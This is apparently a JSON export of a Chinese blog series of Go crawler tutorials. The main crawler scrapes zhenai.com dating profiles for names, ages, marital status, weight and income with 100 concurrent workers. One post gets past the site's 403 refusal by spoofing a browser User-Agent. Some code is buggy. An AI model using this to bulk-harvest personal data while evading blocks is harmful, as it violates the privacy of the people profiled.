fmt.Printf(\"Got item: #%d: %v\\n\",itemsCount,item) itemsCount++ &#125; //分配任务 for _,request:= range result.Requests&#123; e.Scheduler.Submit(request) &#125; &#125;&#125;//工作函数，逻辑是 in通道接收到request，即会调用worker函数爬每一个request中的网址，用对应的解析器。 解析完成后，将ParseResult返回给通道outfunc createWorker(out chan ParseResult,s Scheduler) &#123; in := make(chan Request) go func()&#123; for&#123; //传递到调度器，提示可以开始工作 s.WorkerReady(in) //有任务到工作中 request := &lt;-in //开始工作 result,err:= worker(request) if err!=nil&#123; continue &#125; //工作结果返回 out &lt;-result &#125; &#125;()&#125;/* end engine.go *//* start scheduler.go 简单版调度器，用于分配工作任务 */type SimpleScheduler struct&#123; //通道 workerChan chan Request&#125;func ( s *SimpleScheduler) Submit( r Request) &#123; //为了防止死锁，在调度器中建立go的协程 分配任务到通道中。 go func()&#123;s.workerChan &lt;- r&#125;()&#125;func (s *SimpleScheduler) ConfigureMasterWorkChan(c chan Request) &#123; //in通道 s.workerChan = c&#125;/* end scheduler.go *//* start Queuescheduler.go 队列调度器，用于分配工作任务 */type QueuedScheduler struct &#123; requestChan chan Request workerChan chan chan Request&#125;//提交任务到通道，说明需要完成任务func (s *QueuedScheduler) Submit(r Request) &#123; s.requestChan &lt;-r&#125;//提交工作到通道，说明准备好工作了func (s *QueuedScheduler) WorkerReady(w chan Request)&#123; s.workerChan &lt;- w&#125;func (s *QueuedScheduler) ConfigureMasterWorkChan(chan Request) &#123; panic(\"implement me\")&#125;func (s * QueuedScheduler) Run()&#123; s.workerChan =make(chan chan Request) s.requestChan = make(chan Request) go func()&#123; //任务队列 var requestQ []Request //工作队列 var workQ []chan Request for&#123; var activeRequest Request var activework chan Request //即有工作又有任务，开始工作 if len(requestQ)&gt;0 &amp;&amp; len(workQ) &gt;0&#123; activework = workQ[0] activeRequest = requestQ[0] &#125; select &#123; //任务增加，添加到队列中 case r:=&lt;-s.requestChan: requestQ = append(requestQ,r) //工作增加，添加到队列中 case w:= &lt;-s.workerChan: workQ = append(workQ,w) //有工作又有任务，让工作去做任务 case activework &lt;- activeRequest: workQ = workQ[1:] requestQ=requestQ[1:] &#125; &#125; &#125;()&#125;/* end Queuescheduler.go 队列调度器，用于分配工作任务 */func main()&#123; e:= ConcurrentEngine&#123; Scheduler:&amp;QueuedScheduler&#123;&#125;, WorkerCount:100, &#125; e.Run(Request&#123; Url:\"http://www.zhenai.com/zhenghun\", ParserFunc:ParseCityList, &#125;) ////并发版爬虫 //e:= ConcurrentEngine&#123; // Scheduler:&amp;SimpleScheduler&#123;&#125;, // WorkerCount:100, //&#125; // //e.Run(Request&#123; // Url:\"http://www.zhenai.com/zhenghun\", // ParserFunc:ParseCityList, //&#125;) //单任务版爬虫 //Run(Request&#123; // Url:\"http://www.zhenai.com/zhenghun\", // ParserFunc:ParseCityList, //&#125;) //paseTest()&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[55]-爬虫-并发爬虫引擎","slug":"golang-55-crawler-Concurrent","date":"2019-01-23T16:41:55.000Z","updated":"2019-02-04T08:34:16.171Z","comments":true,"path":"2019/01/24/golang-55-crawler-Concurrent/","link":"","permalink":"https://dreamerjonson.com/2019/01/24/golang-55-crawler-Concurrent/","excerpt":"","text":"go语言实现并发版爬虫，拥有良好的拓展性。效率是单任务的数十倍。 并发版爬虫package mainimport ( \"io/ioutil\" \"golang.org/x/net/html/charset\" \"golang.org/x/text/encoding\" \"bufio\" \"golang.org/x/text/transform\" \"golang.org/x/text/encoding/unicode\" \"log\" \"regexp\" \"strconv\" \"net/http\" \"fmt\" \"time\")var rateLimiter = time.Tick(100 * time.Millisecond)/* start Fetch.go*/func Fetch(url string)([]byte ,error)&#123; //resp,err:= http.Get(url) // //if err!=nil&#123; // return nil,err //&#125; // //defer resp.Body.Close() //if resp.StatusCode != http.StatusOK&#123; // return nil,fmt.Errorf(\"Error: status code:%d\",resp.StatusCode) //&#125; client := &amp;http.Client&#123;&#125; req, err := http.NewRequest(\"GET\", url, nil) if err != nil &#123; log.Fatalln(err) &#125; req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\") resp, err := client.Do(req) if err != nil &#123; log.Fatalln(err) &#125; defer resp.Body.Close() bodyReader:= bufio.NewReader(resp.Body) e:= determineEncoding(bodyReader) utf8reader:= transform.NewReader(bodyReader,e.NewDecoder()) return ioutil.ReadAll(utf8reader)&#125;func determineEncoding(r *bufio.Reader) encoding.Encoding&#123; bytes,err := bufio.NewReader(r).Peek(1024) if err !=nil&#123; log.Printf(\"Fetcher error:%v\",err) return unicode.UTF8 &#125; e,_,_:= charset.DetermineEncoding(bytes,\"\") return e&#125;/* end Fetch.go*//* start Type.go*/type Request struct&#123; Url string ParserFunc func([]byte) ParseResult&#125;type ParseResult struct&#123; Requests []Request Items []interface&#123;&#125;&#125;func NilParser([]byte) ParseResult&#123; return ParseResult&#123;&#125;&#125;/* end Type.go*//* start parser/city.go 爬取城市下每一个用户和网址*/const cityRe = `&lt;a href=\"(http://album.zhenai.com/u/[\\d]+)\" target=\"_blank\"&gt;([^&lt;]+)&lt;/a&gt;`func ParseCity(contents []byte) ParseResult&#123; re:= regexp.MustCompile(cityRe) matches:= re.FindAllSubmatch(contents,-1) result := ParseResult&#123;&#125; for _,m:= range matches&#123; name:=string(m[2]) println(string(m[1])) result.Items = append(result.Items,\"User:\"+string(m[2])) result.Requests = append(result.Requests,Request&#123; Url:string(m[1]), ParserFunc:func(c []byte) ParseResult&#123; return PaesrProfile( c,name) &#125;, &#125;) &#125; return result&#125;/* end parser/city.go *//* start parser/citylist.go */const cityListRe = `(http://www.zhenai.com/zhenghun/[0-9a-z]+)\"[^&gt;]*&gt;([^&lt;]+)&lt;/a&gt;`func ParseCityList(contents []byte) ParseResult&#123; re:=regexp.MustCompile(cityListRe) matches:= re.FindAllSubmatch(contents,-1) result:=ParseResult&#123;&#125; for _,m :=range matches&#123; result.Items = append(result.Items,string(m[2])) result.Requests = append( result.Requests,Request&#123; Url:string(m[1]), ParserFunc:ParseCity, &#125;) &#125; return result&#125;/* end parser/citylist.go *//* start profile.go */type Profile struct &#123; Name string Age int Marry string Constellation string Height int Weight int Salary string&#125;func (p Profile) String() string&#123; return p.Name +\" \" + p.Marry + strconv.Itoa(p.Age) +\"olds \"+ strconv.Itoa(p.Age) + \"cm \" + strconv.Itoa(p.Weight)+ \"kg \"&#125;/* end profile.go *//* start parser/profile.go */var ageRe = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)岁&lt;/div&gt;`)var marry = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;(已婚)&lt;/div&gt;`)var constellation = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;(.*)座&lt;/div&gt;`)var height =regexp.MustCompile(`160cm`)var weight =regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)kg&lt;/div&gt;`)var salary = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;月收入:([^&lt;]+)&lt;/div&gt;`)//解析器 解析用户//name为上一级传递过来的func PaesrProfile(contents []byte,name string) ParseResult&#123; //ioutil.WriteFile(\"test.html\",contents,0x777) //用户结构体 profile:=Profile&#123;&#125; profile.Name = name //年龄 string转换为int age,err:= strconv.Atoi(extractString(contents,ageRe)) if err==nil&#123; profile.Age = age &#125; //身高 height,err:= strconv.Atoi(extractString(contents,height)) if err==nil&#123; profile.Height = height &#125; //体重 weight,err:= strconv.Atoi(extractString(contents,weight)) if err==nil&#123; profile.Weight = weight &#125; //薪水 profile.Salary = extractString(contents,salary) //星座 profile.Constellation = extractString(contents,constellation) if extractString(contents,marry)== \"\"&#123; profile.Marry =\"未婚\" &#125;else&#123; profile.Marry =\"已婚\" &#125; result:=ParseResult&#123; Items:[]interface&#123;&#125;&#123;profile&#125;, &#125; return result&#125;//封装 正则表达式匹配func extractString(contents []byte,re *regexp.Regexp) string&#123; match:=re.FindSubmatch(contents) if len(match)&gt;=2&#123; return string(match[1]) &#125;else&#123; return \"\" &#125;&#125;/* end parser/profile.go *//* start engine.go 单任务版引擎*/func Run(seeds ...Request)&#123; var requests []Request for _,r := range seeds&#123; requests = append(requests,r) &#125; for len(requests) &gt;0&#123; r:=requests[0] requests = requests[1:] fmt.Printf(\"Fetching %s\",r.Url) body,err:= Fetch(r.Url) if err!=nil&#123; log.Printf(\"Fetcher:error \"+ \"fetching url %s, : %v\",r.Url,err) continue &#125; parseResult:= r.ParserFunc(body) requests = append(requests,parseResult.Requests...) for _,item:= range parseResult.Items&#123; fmt.Printf(\"Got item %s\\n\",item) &#125; &#125;&#125;//具体的工作 传递一个request，通过解析器对url进行解析func worker(r Request)(ParseResult,error)&#123; fmt.Printf(\"Fetching %s\\n\",r.Url) body,err:= Fetch(r.Url) if err!=nil&#123; log.Printf(\"Fetcher:error \"+ \"fetching url %s, : %v\",r.Url,err) return ParseResult&#123;&#125;,err &#125; return r.ParserFunc(body),nil&#125;// 并发版爬虫引擎 包含了调度器 与 工人数type ConcurrentEngine struct&#123; Scheduler Scheduler WorkerCount int&#125;//调度器是一个接口，扩展性type Scheduler interface &#123; //提交Request进行执行 Submit(Request) //配置通道 ConfigureMasterWorkChan(chan Request)&#125;//并发版爬虫引擎func (e *ConcurrentEngine) Run(seeds ...Request)&#123; in:=make(chan Request) out:= make(chan ParseResult) //配置调度器通道 e.Scheduler.ConfigureMasterWorkChan(in) //开启WorkerCount个工作 for i:=0;i&lt;e.WorkerCount;i++&#123; createWorker(in,out) &#125; //种子首先运行 for _,r:=range seeds&#123; e.Scheduler.Submit(r) &#125; itemsCount:=0 for&#123; //out等待接受ParseResult result:=&lt;-out //打印出接收到的数据，以及个数。 for _,item:= range result.Items&#123; fmt.Printf(\"Got item: #%d: %v\\n\",itemsCount,item) itemsCount++ &#125; //每一个request都通过调度器发送给in通道，由于在调度器中使用了协程的方式，不会卡死在这里陷入死锁。 for _,request:= range result.Requests&#123; e.Scheduler.Submit(request) &#125; &#125;&#125;//工作函数，逻辑是 in通道接收到request，即会调用worker函数爬每一个request中的网址，用对应的解析器。 解析完成后，将ParseResult返回给通道outfunc createWorker(in chan Request, out chan ParseResult) &#123; go func()&#123; for&#123; request := &lt;-in result,err:= worker(request) if err!=nil&#123; continue &#125; out &lt;-result &#125; &#125;()&#125;/* end engine.go *//* start scheduler.go 简单版调度器，用于分配工作任务 */type SimpleScheduler struct&#123; //通道 workerChan chan Request&#125;func ( s *SimpleScheduler) Submit( r Request) &#123; //为了防止死锁，在调度器中建立go的协程 分配任务到通道中。 go func()&#123;s.workerChan &lt;- r&#125;()&#125;func (s *SimpleScheduler) ConfigureMasterWorkChan(c chan Request) &#123; //in通道 s.workerChan = c&#125;/* end scheduler.go */func main()&#123; //并发版爬虫 e:= ConcurrentEngine&#123; Scheduler:&amp;SimpleScheduler&#123;&#125;, WorkerCount:100, &#125; e.Run(Request&#123; Url:\"http://www.zhenai.com/zhenghun\", ParserFunc:ParseCityList, &#125;) //单任务版爬虫 //Run(Request&#123; // Url:\"http://www.zhenai.com/zhenghun\", // ParserFunc:ParseCityList, //&#125;) //paseTest()&#125;//测试func paseTest()&#123; contents,_:= ioutil.ReadFile(\"test.html\") profile:=Profile&#123;&#125; age,err:= strconv.Atoi(extractString(contents,ageRe)) if err!=nil&#123; profile.Age = age &#125; height,err:= strconv.Atoi(extractString(contents,height)) if err!=nil&#123; profile.Height = height &#125; weight,err:= strconv.Atoi(extractString(contents,weight)) if err!=nil&#123; profile.Weight = weight &#125; profile.Salary = extractString(contents,salary) profile.Constellation = extractString(contents,constellation) if extractString(contents,marry)== \"\"&#123; profile.Marry =\"未婚\" &#125;else&#123; profile.Marry =\"已婚\" &#125; fmt.Printf(\"%s\",profile)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[54]-爬虫-单任务版爬虫爬取相亲页面","slug":"golang-54-crawler-zhengai","date":"2019-01-23T10:32:28.000Z","updated":"2019-02-04T08:34:11.717Z","comments":true,"path":"2019/01/23/golang-54-crawler-zhengai/","link":"","permalink":"https://dreamerjonson.com/2019/01/23/golang-54-crawler-zhengai/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305package mainimport ( \"io/ioutil\" \"golang.org/x/net/html/charset\" \"golang.org/x/text/encoding\" \"bufio\" \"golang.org/x/text/transform\" \"golang.org/x/text/encoding/unicode\" \"log\" \"regexp\" \"strconv\" \"net/http\" \"fmt\")/* start Fetch.go*/func Fetch(url string)([]byte ,error)&#123; //resp,err:= http.Get(url) // //if err!=nil&#123; // return nil,err //&#125; // //defer resp.Body.Close() //if resp.StatusCode != http.StatusOK&#123; // return nil,fmt.Errorf(\"Error: status code:%d\",resp.StatusCode) //&#125; client := &amp;http.Client&#123;&#125; req, err := http.NewRequest(\"GET\", url, nil) if err != nil &#123; log.Fatalln(err) &#125; req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\") resp, err := client.Do(req) if err != nil &#123; log.Fatalln(err) &#125; defer resp.Body.Close() bodyReader:= bufio.NewReader(resp.Body) e:= determineEncoding(bodyReader) utf8reader:= transform.NewReader(bodyReader,e.NewDecoder()) return ioutil.ReadAll(utf8reader)&#125;func determineEncoding(r *bufio.Reader) encoding.Encoding&#123; bytes,err := bufio.NewReader(r).Peek(1024) if err !=nil&#123; log.Printf(\"Fetcher error:%v\",err) return unicode.UTF8 &#125; e,_,_:= charset.DetermineEncoding(bytes,\"\") return e&#125;/* end Fetch.go*//* start Type.go*/type Request struct&#123; Url string ParserFunc func([]byte) ParseResult&#125;type ParseResult struct&#123; Requests []Request Items []interface&#123;&#125;&#125;func NilParser([]byte) ParseResult&#123; return ParseResult&#123;&#125;&#125;/* end Type.go*//* start parser/city.go 爬取城市下每一个用户和网址*/const cityRe = `&lt;a href=\"(http://album.zhenai.com/u/[\\d]+)\" target=\"_blank\"&gt;([^&lt;]+)&lt;/a&gt;`func ParseCity(contents []byte) ParseResult&#123; re:= regexp.MustCompile(cityRe) matches:= re.FindAllSubmatch(contents,-1) result := ParseResult&#123;&#125; for _,m:= range matches&#123; name:=string(m[2]) println(string(m[1])) result.Items = append(result.Items,\"User:\"+string(m[2])) result.Requests = append(result.Requests,Request&#123; Url:string(m[1]), ParserFunc:func(c []byte) ParseResult&#123; return PaesrProfile( c,name) &#125;, &#125;) &#125; return result&#125;/* end parser/city.go *//* start parser/citylist.go */const cityListRe = `(http://www.zhenai.com/zhenghun/[0-9a-z]+)\"[^&gt;]*&gt;([^&lt;]+)&lt;/a&gt;`func ParseCityList(contents []byte) ParseResult&#123; re:=regexp.MustCompile(cityListRe) matches:= re.FindAllSubmatch(contents,-1) result:=ParseResult&#123;&#125; //测试，限制10个城市 limit:= 10 for _,m :=range matches&#123; result.Items = append(result.Items,string(m[2])) result.Requests = append( result.Requests,Request&#123; Url:string(m[1]), ParserFunc:ParseCity, &#125;) limit-- if limit==0&#123; break &#125; &#125; return result&#125;/* end parser/citylist.go *//* start profile.go */type Profile struct &#123; Name string Age int Marry string Constellation string Height int Weight int Salary string&#125;func (p Profile) String() string&#123; return p.Name +\" \" + p.Marry + strconv.Itoa(p.Age) +\"olds \"+ strconv.Itoa(p.Age) + \"cm \" + strconv.Itoa(p.Weight)+ \"kg \"&#125;/* end profile.go *//* start parser/profile.go */var ageRe = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)岁&lt;/div&gt;`)var marry = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;(已婚)&lt;/div&gt;`)var constellation = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;(.*)座&lt;/div&gt;`)var height =regexp.MustCompile(`160cm`)var weight =regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;([\\d]+)kg&lt;/div&gt;`)var salary = regexp.MustCompile(`&lt;div class=\"m-btn purple\" data-v-bff6f798&gt;月收入:([^&lt;]+)&lt;/div&gt;`)//name为上一级传递过来的func PaesrProfile(contents []byte,name string) ParseResult&#123; //ioutil.WriteFile(\"test.html\",contents,0x777) profile:=Profile&#123;&#125; profile.Name = name age,err:= strconv.Atoi(extractString(contents,ageRe)) if err==nil&#123; profile.Age = age &#125; height,err:= strconv.Atoi(extractString(contents,height)) if err==nil&#123; profile.Height = height &#125; weight,err:= strconv.Atoi(extractString(contents,weight)) if err==nil&#123; profile.Weight = weight &#125; profile.Salary = extractString(contents,salary) profile.Constellation = extractString(contents,constellation) if extractString(contents,marry)== \"\"&#123; profile.Marry =\"未婚\" &#125;else&#123; profile.Marry =\"已婚\" &#125; result:=ParseResult&#123; Items:[]interface&#123;&#125;&#123;profile&#125;, &#125; return result&#125;func extractString(contents []byte,re *regexp.Regexp) string&#123; match:=re.FindSubmatch(contents) if len(match)&gt;=2&#123; return string(match[1]) &#125;else&#123; return \"\" &#125;&#125;/* end parser/profile.go *//* start engine.go */func Run(seeds ...Request)&#123; var requests []Request for _,r := range seeds&#123; requests = append(requests,r) &#125; for len(requests) &gt;0&#123; r:=requests[0] requests = requests[1:] fmt.Printf(\"Fetching %s\",r.Url) body,err:= Fetch(r.Url) if err!=nil&#123; log.Printf(\"Fetcher:error \"+ \"fetching url %s, : %v\",r.Url,err) continue &#125; parseResult:= r.ParserFunc(body) requests = append(requests,parseResult.Requests...) for _,item:= range parseResult.Items&#123; fmt.Printf(\"Got item %s\\n\",item) &#125; &#125;&#125;/* end engine.go */func main()&#123; Run(Request&#123; Url:\"http://www.zhenai.com/zhenghun\", ParserFunc:ParseCityList, &#125;) //paseTest()&#125;func paseTest()&#123; contents,_:= ioutil.ReadFile(\"test.html\") profile:=Profile&#123;&#125; age,err:= strconv.Atoi(extractString(contents,ageRe)) if err!=nil&#123; profile.Age = age &#125; height,err:= strconv.Atoi(extractString(contents,height)) if err!=nil&#123; profile.Height = height &#125; weight,err:= strconv.Atoi(extractString(contents,weight)) if err!=nil&#123; profile.Weight = weight &#125; profile.Salary = extractString(contents,salary) profile.Constellation = extractString(contents,constellation) if extractString(contents,marry)== \"\"&#123; profile.Marry =\"未婚\" &#125;else&#123; profile.Marry =\"已婚\" &#125; fmt.Printf(\"%s\",profile)&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[53]-爬虫-解决403错误","slug":"golang-53-crawler-403","date":"2019-01-23T10:11:33.000Z","updated":"2019-02-04T08:34:05.302Z","comments":true,"path":"2019/01/23/golang-53-crawler-403/","link":"","permalink":"https://dreamerjonson.com/2019/01/23/golang-53-crawler-403/","excerpt":"","text":"如下，直接用http.Get(url)进行获取信息，用浏览器可以对该URL进行访问，可是爬取时则返回403，禁止访问 resp,err := http.Get(url) 解决方案：模拟浏览器访问： 1、查看自己浏览器中的User-Agent 信息。 2、将下面代码 resp,err := http.Get(url) defer resp.Body.Close() 替换成下面的代码 client := &amp;http.Client{} req, err := http.NewRequest(&quot;GET&quot;, url, nil) if err != nil { log.Fatalln(err) } //浏览器中的User-Agent req.Header.Set(“User-Agent”, “Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36”) resp, err := client.Do(req) if err != nil { log.Fatalln(err) } defer resp.Body.Close()","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[51]-爬虫-正则表达式进行分组","slug":"golang-52-crawler-group","date":"2019-01-22T13:00:46.000Z","updated":"2019-02-04T08:34:00.534Z","comments":true,"path":"2019/01/22/golang-52-crawler-group/","link":"","permalink":"https://dreamerjonson.com/2019/01/22/golang-52-crawler-group/","excerpt":"","text":"##为正则表达式进行分组 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package mainimport ( \"net/http\" \"io/ioutil\" \"fmt\" \"io\" \"golang.org/x/net/html/charset\" \"golang.org/x/text/encoding\" \"bufio\" \"golang.org/x/text/transform\" \"regexp\")func main()&#123; resp,err:= http.Get(\"http://www.zhenai.com/zhenghun\") if err!=nil&#123; panic(err) &#125; defer resp.Body.Close() if resp.StatusCode != http.StatusOK&#123; fmt.Println(\"Error: status code\",resp.StatusCode) &#125; e:= determineEncoding(resp.Body) utf8reader:= transform.NewReader(resp.Body,e.NewDecoder()) all,err:= ioutil.ReadAll(utf8reader) if err!=nil&#123; panic(err) &#125; //fmt.Printf(\"%s\\n\",all) printCityList(all)&#125;func determineEncoding(r io.Reader) encoding.Encoding&#123; bytes,err := bufio.NewReader(r).Peek(1024) if err !=nil&#123; panic(err) &#125; e,_,_:= charset.DetermineEncoding(bytes,\"\") return e&#125;func printCityList(contents []byte)&#123; re:=regexp.MustCompile(`(http://www.zhenai.com/zhenghun/[0-9a-z]+)\"[^&gt;]*&gt;([^&lt;]+)&lt;/a&gt;`) matches:= re.FindAllSubmatch(contents,-1) for _,m :=range matches&#123; fmt.Printf(\"City: %s,URL:%s\\n \",m[2],m[1]) &#125; fmt.Printf(\"Matches found: %d\\n\",len(matches))&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[51]-爬虫-正则获取网址","slug":"golang-51-crawler","date":"2019-01-22T12:50:15.000Z","updated":"2019-02-04T08:33:55.781Z","comments":true,"path":"2019/01/22/golang-51-crawler/","link":"","permalink":"https://dreamerjonson.com/2019/01/22/golang-51-crawler/","excerpt":"","text":"## 添加正则表达式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package mainimport ( \"net/http\" \"io/ioutil\" \"fmt\" \"io\" \"golang.org/x/net/html/charset\" \"golang.org/x/text/encoding\" \"bufio\" \"golang.org/x/text/transform\" \"regexp\")func main()&#123; resp,err:= http.Get(\"http://www.zhenai.com/zhenghun\") if err!=nil&#123; panic(err) &#125; defer resp.Body.Close() if resp.StatusCode != http.StatusOK&#123; fmt.Println(\"Error: status code\",resp.StatusCode) &#125; e:= determineEncoding(resp.Body) utf8reader:= transform.NewReader(resp.Body,e.NewDecoder()) all,err:= ioutil.ReadAll(utf8reader) if err!=nil&#123; panic(err) &#125; //fmt.Printf(\"%s\\n\",all) printCityList(all)&#125;func determineEncoding(r io.Reader) encoding.Encoding&#123; bytes,err := bufio.NewReader(r).Peek(1024) if err !=nil&#123; panic(err) &#125; e,_,_:= charset.DetermineEncoding(bytes,\"\") return e&#125;func printCityList(contents []byte)&#123; //正则匹配网址http://www.zhenai.com/zhenghun/xiamen\" data-v-4e064b2c&gt;厦门&lt;/a&gt; //[^&gt;]代表以&gt;结尾，*&gt;代表到达之前&gt;之前的东西，可能有换行符。 re:=regexp.MustCompile(`http://www.zhenai.com/zhenghun/[0-9a-z]+\"[^&gt;]*&gt;[^&lt;]+&lt;/a&gt;`) matches:= re.FindAll(contents,-1) for _,m :=range matches&#123; fmt.Printf(\"%s\\n\",m) &#125; fmt.Printf(\"Matches found: %d\\n\",len(matches))&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[49]-解决下载go语言包翻墙问题","slug":"golang-49-gopm","date":"2019-01-22T10:03:46.000Z","updated":"2019-02-04T08:33:51.191Z","comments":true,"path":"2019/01/22/golang-49-gopm/","link":"","permalink":"https://dreamerjonson.com/2019/01/22/golang-49-gopm/","excerpt":"","text":"简介 国内用户在下载go语言包的时候，常常会面临翻墙问题，这里介绍的gopm工具可以解决这一问题。 网址：https://github.com/gpmgo/gopm 简单使用方法：go get -u github.com/gpmgo/gopm 执行文件将会产生在$Gopath/bin目录中。将此目录设置为PATH变量 使用方法 1234567891011121314151617181920212223242526NAME: Gopm - Go Package ManagerUSAGE: Gopm [global options] command [command options] [arguments...]COMMANDS: list list all dependencies of current project gen generate a gopmfile for current Go project get fetch remote package(s) and dependencies bin download and link dependencies and build binary config configure gopm settings run link dependencies and go run test link dependencies and go test build link dependencies and go build install link dependencies and go install clean clean all temporary files update check and update gopm resources including itself help, h Shows a list of commands or help for one commandGLOBAL OPTIONS: --noterm, -n disable color output --strict, -s strict mode --debug, -d debug mode --help, -h show help --version, -v print the version 例子： 12&gt; gopm get -g -v golang.org/x/text&gt; gopm get -g -v golang.org/x/net/html","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[48]-gbk编码转换为Utf8编码","slug":"golang-48-gbkatoUtf8","date":"2019-01-22T10:00:08.000Z","updated":"2019-02-04T08:33:46.272Z","comments":true,"path":"2019/01/22/golang-48-gbkatoUtf8/","link":"","permalink":"https://dreamerjonson.com/2019/01/22/golang-48-gbkatoUtf8/","excerpt":"","text":"在go语言中，如果有时候获取到的中文网站是GBK编码，这时转换为UTF-8编码 需下载两个辅助包： 12&gt; gopm get -g -v golang.org/x/text&gt; gopm get -g -v golang.org/x/net/html 下面简单的爬虫展示将gbk网址转换为UTF-8的例子 12345678910111213141516171819202122232425262728293031323334353637383940414243package mainimport ( \"net/http\" \"io/ioutil\" \"fmt\" \"io\" \"golang.org/x/net/html/charset\" \"golang.org/x/text/encoding\" \"bufio\" \"golang.org/x/text/transform\")func main()&#123; resp,err:= http.Get(\"http://www.chinanews.com/\") if err!=nil&#123; panic(err) &#125; defer resp.Body.Close() if resp.StatusCode != http.StatusOK&#123; fmt.Println(\"Error: status code\",resp.StatusCode) &#125; e:= determineEncoding(resp.Body) utf8reader:= transform.NewReader(resp.Body,e.NewDecoder()) all,err:= ioutil.ReadAll(utf8reader) if err!=nil&#123; panic(err) &#125; fmt.Printf(\"%s\\n\",all)&#125;func determineEncoding(r io.Reader) encoding.Encoding&#123; bytes,err := bufio.NewReader(r).Peek(1024) if err !=nil&#123; panic(err) &#125; e,_,_:= charset.DetermineEncoding(bytes,\"\") return e&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境-网络[17]-go语言建立聊天服务器的3种案例赏析","slug":"go-network-17-p2p-chat","date":"2019-01-19T14:19:18.000Z","updated":"2019-02-04T08:39:19.565Z","comments":true,"path":"2019/01/19/go-network-17-p2p-chat/","link":"","permalink":"https://dreamerjonson.com/2019/01/19/go-network-17-p2p-chat/","excerpt":"","text":"案例1 如何在55行Golang中编写TCP聊天服务器? go net包允许你编写TCP服务器。这是一个聊天服务器，客户端发送的每个字节都被复制到每个其他客户端（包括发送者） 代码比较精彩，在主程序中建立了3个通道，分别是新链接、断开链接、广播信息。作者非常巧妙的将代码压缩到55行， 虽然每一个客户端都在抢夺通道的信息，但是作者通过通道的缓冲区来缓解这个问题，目前这套代码已经能够处理非常大量的并发聊天。 此代码的缺陷在于，在不断的广播过程中，可能会开辟无数的协程处理写入数据的操作，这时会造成消息堵塞，甚至消息不按照顺序到达。。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960package mainimport \"net\"func main() &#123; newConns := make(chan net.Conn, 128)//新链接 deadConns := make(chan net.Conn, 128)//断开链接 publishes := make(chan []byte, 128)//广播信息 conns := make(map[net.Conn]bool) listener, err := net.Listen(\"tcp\", \":8080\") defer listener.Close() if err != nil &#123; panic(err) &#125; //防止卡住 go func() &#123; for &#123; conn, err := listener.Accept() if err != nil &#123; panic(err) &#125; newConns &lt;- conn &#125; &#125;() for &#123; select &#123; case conn := &lt;-newConns: //新建链接后，会开辟协程不断短期客户端发出的消息 conns[conn] = true go func() &#123; buf := make([]byte, 1024) for &#123; nbyte, err := conn.Read(buf) if err != nil &#123; deadConns &lt;- conn break &#125; else &#123; fragment := make([]byte, nbyte) copy(fragment, buf[:nbyte]) publishes &lt;- fragment &#125; &#125; &#125;() case deadConn := &lt;-deadConns: //断开链接、关闭资源 _ = deadConn.Close() delete(conns, deadConn) //缺陷 case publish := &lt;-publishes: // 广播给所有的 for conn, _ := range conns &#123; go func(conn net.Conn) &#123; totalWritten := 0 for totalWritten &lt; len(publish) &#123; writtenThisCall, err := conn.Write(publish[totalWritten:]) if err != nil &#123; deadConns &lt;- conn break &#125; 